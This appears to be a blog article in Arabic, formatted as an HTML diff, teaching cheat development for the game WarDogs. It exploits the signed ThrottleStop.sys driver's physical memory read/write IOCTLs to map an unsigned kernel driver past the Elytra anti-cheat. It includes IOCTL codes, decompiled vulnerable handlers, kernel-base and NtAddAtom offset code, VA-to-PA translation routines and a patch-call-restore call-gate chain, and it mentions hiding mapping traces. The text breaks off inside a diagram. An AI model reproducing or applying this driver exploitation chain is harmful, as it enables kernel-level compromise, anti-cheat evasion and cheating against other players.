@@ -1,0 +1,3233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Build ESP on WarDogs Game Part 1: Exploit Vulnerable Driver to Mapping Unsigned Driver | Jehad Alqurashi</title>
+<meta name="description" content="Part 1: how BYOVD works, how ThrottleStop.sys is abused, and how tsmapper maps the WarDogs ESP driver before the Elytra anti-cheat analysis.">
+<meta property="og:title" content="Build ESP on WarDogs Game Part 1: Exploit Vulnerable Driver to Mapping Unsigned Driver">
+<meta property="og:description" content="A clear walkthrough of BYOVD, the ThrottleStop.sys IOCTLs, and the loader used to map the final WarDogs ESP driver.">
+<meta property="og:type" content="article">
+<link rel="canonical" href="https://jehadalqurashi.github.io/articles/game-cheat-development-part1.html">
+<link rel="stylesheet" href="../assets/css/style.css">
+<style>
+.diagram-stack { display: grid; gap: 18px; margin: 24px 0 12px; }
+.diagram { margin: 0; padding: 10px; background: #0b1020; border: 1px solid rgba(255,255,255,.07); border-radius: 12px; }
+.diagram svg { display: block; width: 100%; height: auto; direction: ltr; }
+.diagram figcaption { margin-top: 8px; color: #8892a4; font-size: 13px; line-height: 1.5; }
+.diagram figcaption strong { color: #cbd5e1; }
+.series-badge { display: inline-block; margin-bottom: 14px; padding: 4px 10px; border: 1px solid rgba(0,212,255,.25); border-radius: 6px; color: #00d4ff; background: rgba(0,212,255,.06); font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: 1px; }
+.result-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 18px 0 24px; }
+.result-card { background: #0b1020; border: 1px solid rgba(255,255,255,.07); border-radius: 10px; padding: 14px; }
+.result-card h4 { margin: 0 0 10px; color: #e2e8f0; font-size: 13px; font-family: 'JetBrains Mono', monospace; }
+.result-card pre { margin: 0; padding: 14px; font-size: 11px; line-height: 1.7; }
+@media (max-width: 768px) { .result-grid { grid-template-columns: 1fr; } }
+.code-lines .ln { color: #64748b; display: inline-block; width: 2.3em; margin-right: 0.55em; text-align: right; user-select: none; }
+
+
+
+.source-files pre { max-height: 520px; overflow: auto; overscroll-behavior: contain; scrollbar-color: #334155 #020617; }
+.source-files pre code { display: block; tab-size: 4; }
+
+</style>
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">game-hacking</a><span class="sep">/</span><span>Build ESP on WarDogs Game — Part 1</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">game-hacking</span>
+<span class="post-date">2026-11-21</span>
+</div>
+<div class="series-badge">SERIES / PART 1</div>
+<h1 class="post-title">Build ESP on WarDogs Game Part 1: Exploit Vulnerable Driver to Mapping Unsigned Driver</h1>
+</header>
+
+
+<div id="content-ar" class="post-content rtl-content" style="direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم، حمداً والصلاة والسلام على نبينا محمد أشرف الخلق والمرسلين، أما بعد:</p>
+<p>في الجزء الأول من المقالة حاب أستعرض فكرة <strong>Bring Your Own Vulnerable Driver</strong> وكيف تشتغل، قبل ما نبدأ تحليل الـ anti-cheat الموجود في WarDogs، وهو Elytra.</p>
+<p>فكرة BYOVD باختصار إننا نستغل درايفر مصاب وعليه شهادة مرخصة من قبل أي مقدم خدمة. بعض هذي الدرايفرات تستخدمها برامج مشهورة مثل MSI Afterburner أو أدوات HWID أو غيرها، وعشان كذا تكون موقعة وموثوقة من ويندوز.</p>
+<p>استغلال درايفر مرخص يعطيك وصول إلى Kernel Level، يعني تصير أنت والـ anti-cheat على نفس المستوى. بعدها تقدر تحمل درايفر غير مرخص يخص الـ ESP أو الـ Wall Hack، وتقرأ process اللعبة بدون ما تفتح handle عليها. في هذي المقالة راح أشرح كل خطوة، وأتكلم عن الطرق اللي نخفي فيها آثار الـ mapping.</p>
+
+<h2>أنواع الشيتات</h2>
+<p>قبل ندخل في الكود، لازم نفرق بين أنواع الشيتات:</p>
+<h3>Internal cheat</h3>
+<p>DLL يشتغل داخل بروسيس اللعبة. يقرأ ويعدل الذاكرة مباشرة، لكنه أسهل كشف للـ anti-cheat.</p>
+
+<h3>External cheat</h3>
+<p>بروسيس منفصل يقرأ البروسيس الخاص باللعبة عن طريق الدرايفر الخاص بالشيت هذا النوع من الشيت آمن اكثر وهذا اللي راح نتطرق له في المقالات الجاية</p>
+
+<h2>1. ليش ما نقدر نقرأ ذاكرة اللعبة مباشرة؟</h2>
+<p>أسهل شيت خارجي يستخدم <code>OpenProcess</code> و<code>ReadProcessMemory</code>. هذا يشتغل على الألعاب غير المحمية، لكنه يترك handle على اللعبة. الـ anti-cheat يقدر يشوف الـ handle والـ process access والموديول اللي فتحه. هذا ينبّه الحماية أن فيه بروسيس غير معروف يحاول يقرأ بروسيس اللعبة.</p>
+<p>نحتاج قراءة ذاكرة بدون ما ننشئ handle على اللعبة. الكيرنل عنده primitive جاهز: الدرايفر يقدر يحول عنوان virtual إلى صفحة physical وينسخ منها. المشكلة إن ويندوز ما يحمل درايفرنا unsigned من الـ service manager.</p>
+<p>عشان كذا نستعير درايفر موقّع وفيه ثغرة، ونستغلها عشان نشغّل الدرايفر الخاص بنا غير الموقّع، ونقرأ بروسيس اللعبة بدون ما ننكشف. هذا اسمه <strong>BYOVD</strong> — Bring Your Own Vulnerable Driver.</p>
+
+<p>الرسمة تحت توضح الفكرة.</p>
+
+<div class="diagram-stack">
+<figure class="diagram">
+<svg viewBox="0 0 960 450" role="img" aria-labelledby="fig1ar-title">
+<title id="fig1ar-title">tsmapper bootstrap flow: base, function, patch</title>
+<defs><marker id="fig1ar-arrow" markerWidth="10" markerHeight="10" refX="8" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#64748b"/></marker></defs>
+<rect x="1" y="1" width="958" height="448" rx="14" fill="#0b1020" stroke="#1e293b"/>
+<text x="30" y="38" fill="#00d4ff" font-family="JetBrains Mono, monospace" font-size="13" letter-spacing="2">TSMAPPER — BASE → FUNCTION → PATCH</text>
+
+<rect x="20" y="65" width="210" height="82" rx="9" fill="#111827" stroke="#f59e0b" stroke-opacity=".6"/>
+<text x="125" y="92" fill="#fbbf24" font-family="JetBrains Mono, monospace" font-size="13" text-anchor="middle">tsmapper.exe</text>
+<text x="125" y="115" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">user mode loader</text>
+<text x="125" y="134" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">loads the primitive</text>
+
+<rect x="260" y="65" width="210" height="82" rx="9" fill="#111827" stroke="#00d4ff" stroke-opacity=".55"/>
+<text x="365" y="90" fill="#e2e8f0" font-family="Inter, sans-serif" font-size="12" font-weight="700" text-anchor="middle">NtQuerySystemInformation</text>
+<text x="365" y="113" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">SystemModuleInformation</text>
+<text x="365" y="132" fill="#8892a4" font-family="JetBrains Mono, monospace" font-size="10" text-anchor="middle">loaded module list</text>
+
+<rect x="500" y="65" width="210" height="82" rx="9" fill="#111827" stroke="#10b981" stroke-opacity=".55"/>
+<text x="605" y="92" fill="#6ee7b7" font-family="JetBrains Mono, monospace" font-size="13" text-anchor="middle">ntoskrnl base</text>
+<text x="605" y="115" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">runtime ImageBase</text>
+<text x="605" y="134" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">randomized by KASLR</text>
+
+<rect x="740" y="65" width="200" height="82" rx="9" fill="#111827" stroke="#8b5cf6" stroke-opacity=".55"/>
+<text x="840" y="92" fill="#c4b5fd" font-family="JetBrains Mono, monospace" font-size="13" text-anchor="middle">local ntoskrnl</text>
+<text x="840" y="115" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">export table</text>
+<text x="840" y="134" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">NtAddAtom RVA</text>
+
+<line x1="230" y1="106" x2="255" y2="106" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<line x1="470" y1="106" x2="495" y2="106" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<line x1="710" y1="106" x2="735" y2="106" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+
+<rect x="740" y="190" width="200" height="82" rx="9" fill="#111827" stroke="#8b5cf6" stroke-opacity=".55"/>
+<text x="840" y="217" fill="#c4b5fd" font-family="JetBrains Mono, monospace" font-size="13" text-anchor="middle">NtAddAtom VA</text>
+<text x="840" y="240" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">base + RVA</text>
+<text x="840" y="259" fill="#8892a4" font-family="JetBrains Mono, monospace" font-size="10" text-anchor="middle">kernel virtual address</text>
+
+<rect x="500" y="190" width="210" height="82" rx="9" fill="#111827" stroke="#f59e0b" stroke-opacity=".55"/>
+<text x="605" y="217" fill="#fbbf24" font-family="JetBrains Mono, monospace" font-size="13" text-anchor="middle">VA → PA</text>
+<text x="605" y="240" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">Superfetch map</text>
+<text x="605" y="259" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">or MmGetPhysicalAddress</text>
+
+<rect x="260" y="190" width="210" height="82" rx="9" fill="#111827" stroke="#10b981" stroke-opacity=".55"/>
+<text x="365" y="217" fill="#6ee7b7" font-family="JetBrains Mono, monospace" font-size="13" text-anchor="middle">save 16 bytes</text>
+<text x="365" y="240" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">ReadPhysicalBuffer</text>
+<text x="365" y="259" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">original NtAddAtom</text>
+
+<rect x="20" y="190" width="210" height="82" rx="9" fill="#111827" stroke="#ef4444" stroke-opacity=".55"/>
+<text x="125" y="217" fill="#fca5a5" font-family="JetBrains Mono, monospace" font-size="12" text-anchor="middle">mov rax, target</text>
+<text x="125" y="237" fill="#fca5a5" font-family="JetBrains Mono, monospace" font-size="12" text-anchor="middle">jmp rax</text>
+<text x="125" y="259" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">WritePhysicalBuffer</text>
+
+<line x1="840" y1="147" x2="840" y2="185" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<line x1="740" y1="231" x2="715" y2="231" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<line x1="500" y1="231" x2="475" y2="231" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<line x1="260" y1="231" x2="235" y2="231" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+
+<rect x="20" y="330" width="250" height="78" rx="9" fill="#111827" stroke="#00d4ff" stroke-opacity=".55"/>
+<text x="145" y="357" fill="#e2e8f0" font-family="Inter, sans-serif" font-size="13" font-weight="700" text-anchor="middle">call ntdll!NtAddAtom</text>
+<text x="145" y="380" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">syscall enters the kernel</text>
+
+<rect x="310" y="330" width="280" height="78" rx="9" fill="#111827" stroke="#10b981" stroke-opacity=".55"/>
+<text x="450" y="357" fill="#6ee7b7" font-family="Inter, sans-serif" font-size="13" font-weight="700" text-anchor="middle">target kernel function</text>
+<text x="450" y="380" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">ExAllocatePool / MmGetPhysical</text>
+
+<rect x="630" y="330" width="300" height="78" rx="9" fill="#111827" stroke="#ef4444" stroke-opacity=".55"/>
+<text x="780" y="357" fill="#fca5a5" font-family="Inter, sans-serif" font-size="13" font-weight="700" text-anchor="middle">map kdriver.sys</text>
+<text x="780" y="380" fill="#8892a4" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">restore NtAddAtom + cleanup</text>
+
+<line x1="230" y1="272" x2="145" y2="325" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<line x1="270" y1="369" x2="305" y2="369" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<line x1="590" y1="369" x2="625" y2="369" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig1ar-arrow)"/>
+<text x="480" y="435" fill="#64748b" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">tsmapper only — the ESP client is not part of this stage.</text>
+</svg>
+<figcaption><strong>Figure 1.</strong> tsmapper gets the ntoskrnl base, resolves NtAddAtom VA and PA, writes a temporary jump, calls it, and then maps the final driver.</figcaption>
+</figure>
+</div>
+
+<h2>2. الدرايفر المصاب: ThrottleStop.sys</h2>
+<p>ThrottleStop داريفر موقّع مصاب بـ(R,W) Primitive.
+<pre><code>File:      ThrottleStop.sys
+SHA-256:   16f83f056177c4ec24c7e99d01ca9d9d6713bd0497eeedb777a3ffefa99c97f0
+ImageBase: 0x140000000
+Device:    \Device\ThrottleStop
+User path: \\.\ThrottleStop</code></pre>
+
+<p>الدالة المهمة هي IOCTL dispatcher في <code>0x140001EF0</code>. تقرأ كود الـ IOCTL وتنقز إلى handler. عندنا handlerين يهموننا:</p>
+<pre><code>0x80006498  -> physical read  @ 0x140002184
+0x8000649C  -> physical write @ 0x140002271</code></pre>
+
+<h3>الكود بعد الـ decompile</h3>
+<pre class="code-lines"><code><span class="ln">01</span>NTSTATUS ReadPhysical(PIRP Irp) {  // READ primitive (line 01)
+<span class="ln">02</span>    auto* stack = IoGetCurrentIrpStackLocation(Irp);
+<span class="ln">03</span>
+<span class="ln">04</span>    if (stack-&gt;Parameters.DeviceIoControl.InputBufferLength != 8)
+<span class="ln">05</span>        return STATUS_INFO_LENGTH_MISMATCH;
+<span class="ln">06</span>
+<span class="ln">07</span>    ULONG size = stack-&gt;Parameters.DeviceIoControl.OutputBufferLength;
+<span class="ln">08</span>    if (size != 1 &amp;&amp; size != 2 &amp;&amp; size != 4 &amp;&amp; size != 8)
+<span class="ln">09</span>        return STATUS_INVALID_PARAMETER;
+<span class="ln">10</span>
+<span class="ln">11</span>    ULONG64 pa = *(ULONG64*)Irp-&gt;AssociatedIrp.SystemBuffer;
+<span class="ln">12</span>
+<span class="ln">13</span>    PVOID mapped = MmMapIoSpace(pa, size, 0);  // physical map
+<span class="ln">14</span>    if (!mapped)
+<span class="ln">15</span>        return STATUS_UNSUCCESSFUL;
+<span class="ln">16</span>
+<span class="ln">17</span>    memcpy(Irp-&gt;AssociatedIrp.SystemBuffer, mapped, size);
+<span class="ln">18</span>    MmUnmapIoSpace(mapped, size);
+<span class="ln">19</span>
+<span class="ln">20</span>    Irp-&gt;IoStatus.Information = size;
+<span class="ln">21</span>    return STATUS_SUCCESS;
+<span class="ln">22</span>}
+<span class="ln">23</span>
+<span class="ln">24</span>NTSTATUS WritePhysical(PIRP Irp) {  // WRITE primitive (line 24)
+<span class="ln">25</span>    auto* stack = IoGetCurrentIrpStackLocation(Irp);
+<span class="ln">26</span>
+<span class="ln">27</span>    if (stack-&gt;Parameters.DeviceIoControl.OutputBufferLength != 0)
+<span class="ln">28</span>        return STATUS_INVALID_PARAMETER;
+<span class="ln">29</span>
+<span class="ln">30</span>    ULONG size = stack-&gt;Parameters.DeviceIoControl.InputBufferLength - 8;
+<span class="ln">31</span>    if (size != 1 &amp;&amp; size != 2 &amp;&amp; size != 4 &amp;&amp; size != 8)
+<span class="ln">32</span>        return STATUS_INVALID_PARAMETER;
+<span class="ln">33</span>
+<span class="ln">34</span>    UCHAR* buffer = (UCHAR*)Irp-&gt;AssociatedIrp.SystemBuffer;
+<span class="ln">35</span>    ULONG64 pa = *(ULONG64*)buffer;
+<span class="ln">36</span>    ULONG64 value = *(ULONG64*)(buffer + 8);
+<span class="ln">37</span>
+<span class="ln">38</span>    PVOID mapped = MmMapIoSpace(pa, size, 0);  // physical map
+<span class="ln">39</span>    if (!mapped)
+<span class="ln">40</span>        return STATUS_UNSUCCESSFUL;
+<span class="ln">41</span>
+<span class="ln">42</span>    memcpy(mapped, &amp;value, size);
+<span class="ln">43</span>    MmUnmapIoSpace(mapped, size);
+<span class="ln">44</span>
+<span class="ln">45</span>    Irp-&gt;IoStatus.Information = 0;
+<span class="ln">46</span>    return STATUS_SUCCESS;
+<span class="ln">47</span>}</code></pre>
+
+<h3>الأصابة</h3>
+<ul>
+<li><strong>الأسطر 11–18:</strong> يأخذ أي physical address، و<code>MmMapIoSpace</code> يسوي mapping له، والبايتات تنسخ إلى output buffer. هذا read primitive.</li>
+<li><strong>الأسطر 34–43:</strong> يأخذ physical address و value ويكتب القيمة في الـphysical address  اللي نبيه هذا write primitive.</li>
+<li><strong>الأسطر 4–9 و27–32:</strong> زي ما نلاحظ، لا يوجد شيك على input/output للعنوان اللي نحتاج نقرأ منه أو نكتب فيه، وهذا هو سبب الإصابة.</li>
+</ul>
+
+<p>ببساطة نقدر نكتب الى أي physical page في الكيرنل او نقرأ منها سواء كانت  read-only او غيره راح نستخدم فنشكن NtAddAtom كـCall Gate عشانها غير مستخدمة بكثرة في النظام ونقدر نستدعيها عن طريق اليوزر مود  </p>
+
+<h3>ايش هو الـKASLR </h3>
+<p> ببساطة هي حماية كل مره تشغل الجهاز راح يختلف معك الـAddress الخاصة بالنظام. ليش نحتاجها؟ عشان ودنا نعرف مكان الفنكشن Ntaddatom اللي راح نكتب عليها الدرايفر الخاص فينا </p>
+
+<p>المعادلة كالتالي وراح نستخرجها عن طريق الـntsokrnl.exe:</p>
+<pre><code>runtime address = kernel base + function offset</code></pre>
+<p>إذا استخدمنا base غلط في القراءة او الكتابة ممكن الجهاز يسوي Blue Screen of Death</p>
+<p>كيف نجيب الـBASE:</p>
+<pre><code>uint64_t GetKernelModuleAddress(const std::string&amp; name) {
+    // نسأل ويندوز عن الموديولات المحملة في الكيرنل.
+    NtQuerySystemInformation(SystemModuleInformation,
+                             buffer, size, &amp;size);
+
+    auto* modules = (RTL_PROCESS_MODULES*)buffer;
+
+    // ندور على الموديول المطلوب، مثل ntoskrnl.exe.
+    for (UINT i = 0; i &lt; modules-&gt;NumberOfModules; ++i) {
+        const char* path = modules-&gt;Modules[i].FullPathName +
+                           modules-&gt;Modules[i].OffsetToFileName;
+
+        if (!_stricmp(path, name.c_str()))
+            // هذا هو الـ base الحقيقي بعد KASLR.
+            return (uint64_t)modules-&gt;Modules[i].ImageBase;
+    }
+    return 0;
+}</code></pre>
+<p>بعدها نجيب أوفست الدالة: :</p>
+<pre>
+hLocalNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL,
+                                DONT_RESOLVE_DLL_REFERENCES);
+
+FARPROC p = GetProcAddress(hLocalNtoskrnl, "NtAddAtom");
+
+uint64_t offset = (uint64_t)p - (uint64_t)hLocalNtoskrnl;
+
+uint64_t runtime_va = ntoskrnlAddr + offset;</code></pre>
+
+<h3>الفرق بين PA وVA؟</h3>
+<p> قبل شرح الـPA و الـVA نحتاج نفهمها لان الدرايفر اللي راح نستغله يقبل Physical Address فقط والـقيم اللي استخرجناها من الكود السابق هي VA.</p>
+
+<p>في tsmapper التحويل الأولي ما يصير عن طريق page-table walk. يصير عن طريق Superfetch، وهذي الدالتين الفعليتين اللي تبني الخريطة وتستخدمها:</p>
+
+<h3>BuildTranslationMap</h3>
+<p>تبني خريطة من كل صفحة <code>VA</code> إلى <code>PA</code>، باستخدام <code>NtQuerySystemInformation</code> مع <code>SystemSuperfetchInformation</code>. الخريطة تحفظ <code>VA page</code> مقابل <code>PA</code>.</p>
+<pre><code>inline TranslationMap BuildTranslationMap() {
+    TranslationMap map;
+
+    if (!RaisePrivileges())
+        return map;
+
+    auto ranges = QueryMemoryRanges();
+    if (ranges.empty())
+        return map;
+
+    for (const auto&amp; range : ranges) {
+        size_t buf_len = sizeof(PF_PFN_PRIO_REQUEST) +
+                         sizeof(MMPFN_IDENTITY) * range.page_count;
+
+        auto buffer = std::make_unique&lt;uint8_t[]&gt;(buf_len);
+        auto request = reinterpret_cast&lt;PF_PFN_PRIO_REQUEST*&gt;(buffer.get());
+        request-&gt;Version = 1;
+        request-&gt;RequestFlags = 1;
+        request-&gt;PfnCount = range.page_count;
+
+        for (uint64_t i = 0; i &lt; range.page_count; ++i)
+            request-&gt;PageData[i].PageFrameIndex = range.pfn + i;
+
+        if (!NT_SUCCESS(QuerySuperfetchInfo(
+                SuperfetchPfnQuery, request, (ULONG)buf_len)))
+            continue;
+
+        for (uint64_t i = 0; i &lt; range.page_count; ++i) {
+            void* virt = request-&gt;PageData[i].u2.VirtualAddress;
+            if (virt) {
+                uint64_t va_page = reinterpret_cast&lt;uint64_t&gt;(virt) &amp; ~0xFFFull;
+                uint64_t pa = (range.pfn + i) &lt;&lt; 12;
+                map[va_page] = pa;
+            }
+        }
+    }
+
+    return map;
+}</code></pre>
+
+<h3>Translate</h3>
+<p>تاخذ عنوان <code>VA</code>، تحسب رقم الصفحة، تدور عليها في الخريطة، وترجع الـ <code>PA</code> مع الـ offset داخل الصفحة. إذا الصفحة مو موجودة ترجع <code>0</code>.</p>
+<pre><code>inline uint64_t Translate(const TranslationMap&amp; map, uint64_t va) {
+    uint64_t va_page = va &amp; ~0xFFFull;
+
+    auto it = map.find(va_page);
+    if (it == map.end())
+        return 0;
+
+    return it-&gt;second + (va &amp; 0xFFF);
+}</code></pre>
+
+<p>وهذا page-table walk كامل للتوضيح:</p>
+<p>طريقة التحويل من VA الى PA</p>
+<pre><code>uint64_t VaToPa(uint64_t va) {
+    uint64_t cr3 = __readcr3();
+    uint64_t pml4e = read64((cr3 &amp; ~0xFFFull) + ((va &gt;&gt; 39) &amp; 0x1FF) * 8);
+    if (!(pml4e &amp; 1)) return 0;
+
+    uint64_t pdpte = read64((pml4e &amp; 0x000FFFFFFFFFF000ULL) + ((va &gt;&gt; 30) &amp; 0x1FF) * 8);
+    if (!(pdpte &amp; 1)) return 0;
+    if (pdpte &amp; 0x80) return (pdpte &amp; 0x000FFFFFC0000000ULL) | (va &amp; 0x3FFFFFFF);
+
+    uint64_t pde = read64((pdpte &amp; 0x000FFFFFFFFFF000ULL) + ((va &gt;&gt; 21) &amp; 0x1FF) * 8);
+    if (!(pde &amp; 1)) return 0;
+    if (pde &amp; 0x80) return (pde &amp; 0x000FFFFFFFE00000ULL) | (va &amp; 0x1FFFFF);
+
+    uint64_t pte = read64((pde &amp; 0x000FFFFFFFFFF000ULL) + ((va &gt;&gt; 12) &amp; 0x1FF) * 8);
+    if (!(pte &amp; 1)) return 0;
+
+    return (pte &amp; 0x000FFFFFFFFFF000ULL) | (va &amp; 0xFFF);
+}</code></pre>
+<h2>3. الإستغلال</h2>
+<p>الإستغلال يمر على خمس مراحل:</p>
+<ol>
+<li>نجيب <code>Kernel Base</code> وأوفست <code>NtAddAtom</code>.</li>
+<li>نحوّل عنوان <code>NtAddAtom</code> من <code>VA</code> إلى <code>PA</code>.</li>
+<li>نبني call gate مؤقت على <code>NtAddAtom</code>:
+  <ul>
+    <li>نحفظ أول 16 بايت من الدالة.</li>
+    <li>نكتب <code>jmp</code> للدالة اللي نبي نناديها.</li>
+    <li>ننادي <code>ntdll!NtAddAtom</code>.</li>
+    <li>نرجع البايتات الأصلية بعد النداء.</li>
+  </ul>
+</li>
+<li>نسوي mapping لـدرايفر <code>kdriver.sys</code>:
+  <ul>
+    <li><code>ExAllocatePoolWithTag</code> — نحجز pool للدرايفر.</li>
+    <li><code>MmGetPhysicalAddress</code> — ناخذ PA للـ pool.</li>
+    <li>نقرا الدرايفر من الدسك ونسوي resolve للفنكشنز.</li>
+    <li>نكتب الصورة في الـ pool، وبعدها <code>jmp</code> إلى <code>DriverEntry</code>.</li>
+  </ul>
+</li>
+<li>ننظف آثار اللودر.</li>
+</ol>
+<p>الرسمة تحت توضح كل مرحلة بالتفصيل: من وين نجيب العنوان، كيف يتحول، وش يصير داخل الـ call gate، وبعدها mapping والتنظيف.</p>
+
+
+<figure class="diagram">
+<svg viewBox="0 0 960 980" role="img" aria-labelledby="fig2ar-title">
+<title id="fig2ar-title">Full chain and full NtAddAtom call gate through ThrottleStop IOCTLs</title>
+<defs>
+<marker id="fig2ar-arrow" markerWidth="10" markerHeight="10" refX="8" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#64748b"/></marker>
+<linearGradient id="fig2ar-top" x1="0" x2="1" y1="0" y2="0">
+<stop offset="0" stop-color="#00d4ff" stop-opacity=".7"/>
+<stop offset=".5" stop-color="#f59e0b" stop-opacity=".5"/>
+<stop offset="1" stop-color="#10b981" stop-opacity=".7"/>
+</linearGradient>
+</defs>
+<rect x="1" y="1" width="958" height="978" rx="14" fill="#0b1020" stroke="#1e293b"/>
+<rect x="18" y="16" width="924" height="2" rx="1" fill="url(#fig2ar-top)"/>
+<text x="30" y="43" fill="#00d4ff" font-family="JetBrains Mono, monospace" font-size="13" letter-spacing="2">FULL CHAIN — IOCTL → CALL GATE → DRIVER</text>
+<text x="30" y="65" fill="#8892a4" font-family="Inter, sans-serif" font-size="11">ThrottleStop physical R/W, the full NtAddAtom gate, and the final mapped driver</text>
+
+<rect x="60" y="82" width="380" height="64" rx="9" fill="#111827" stroke="#00d4ff" stroke-opacity=".55"/>
+<text x="250" y="107" fill="#e2e8f0" font-family="JetBrains Mono, monospace" font-size="13" font-weight="700" text-anchor="middle">tsmapper.exe</text>
+<text x="250" y="127" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">user mode · DeviceIoControl</text>
+
+<line x1="440" y1="114" x2="515" y2="114" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<rect x="520" y="82" width="380" height="64" rx="9" fill="#111827" stroke="#8b5cf6" stroke-opacity=".55"/>
+<text x="710" y="107" fill="#e2e8f0" font-family="JetBrains Mono, monospace" font-size="13" font-weight="700" text-anchor="middle">\\.\ThrottleStop</text>
+<text x="710" y="127" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">ThrottleStop.sys · signed vulnerable driver</text>
+
+<rect x="40" y="178" width="430" height="105" rx="9" fill="#111827" stroke="#00d4ff" stroke-opacity=".55"/>
+<text x="255" y="203" fill="#00d4ff" font-family="JetBrains Mono, monospace" font-size="12" font-weight="700" text-anchor="middle">IOCTL 0x80006498</text>
+<text x="255" y="224" fill="#e2e8f0" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">physical read</text>
+<text x="255" y="246" fill="#94a3b8" font-family="JetBrains Mono, monospace" font-size="10" text-anchor="middle">input PA → output 1/2/4/8 bytes</text>
+<text x="255" y="264" fill="#64748b" font-family="Inter, sans-serif" font-size="9.5" text-anchor="middle">MmMapIoSpace + memcpy · ReadPhysicalBuffer</text>
+
+<rect x="490" y="178" width="430" height="105" rx="9" fill="#111827" stroke="#f59e0b" stroke-opacity=".55"/>
+<text x="705" y="203" fill="#fbbf24" font-family="JetBrains Mono, monospace" font-size="12" font-weight="700" text-anchor="middle">IOCTL 0x8000649C</text>
+<text x="705" y="224" fill="#e2e8f0" font-family="Inter, sans-serif" font-size="11" text-anchor="middle">physical write</text>
+<text x="705" y="246" fill="#94a3b8" font-family="JetBrains Mono, monospace" font-size="10" text-anchor="middle">input PA + value → no output</text>
+<text x="705" y="264" fill="#64748b" font-family="Inter, sans-serif" font-size="9.5" text-anchor="middle">mmap + memcpy · WritePhysicalBuffer</text>
+
+<rect x="280" y="315" width="400" height="65" rx="9" fill="#111827" stroke="#10b981" stroke-opacity=".55"/>
+<text x="480" y="340" fill="#6ee7b7" font-family="JetBrains Mono, monospace" font-size="13" font-weight="700" text-anchor="middle">PHYSICAL MEMORY</text>
+<text x="480" y="360" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">ntoskrnl pages + non-paged pool</text>
+
+<rect x="40" y="410" width="880" height="240" rx="10" fill="#111827" stroke="#f59e0b" stroke-opacity=".55"/>
+<text x="60" y="438" fill="#fbbf24" font-family="JetBrains Mono, monospace" font-size="13" font-weight="700">nt!NtAddAtom — FULL CALL GATE</text>
+<text x="60" y="457" fill="#8892a4" font-family="Inter, sans-serif" font-size="10">save → patch → call → restore; every physical read/write uses a ThrottleStop IOCTL</text>
+
+<rect x="60" y="470" width="195" height="140" rx="8" fill="#0f172a" stroke="#00d4ff" stroke-opacity=".45"/>
+<text x="157" y="495" fill="#00d4ff" font-family="JetBrains Mono, monospace" font-size="11" font-weight="700" text-anchor="middle">SAVE</text>
+<text x="157" y="519" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">ReadPhysicalBuffer(paNtAddAtom,</text>
+<text x="157" y="538" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">&amp;original, 16)</text>
+<text x="157" y="560" fill="#94a3b8" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">IOCTL 0x80006498</text>
+<text x="157" y="582" fill="#64748b" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">original[16]</text>
+
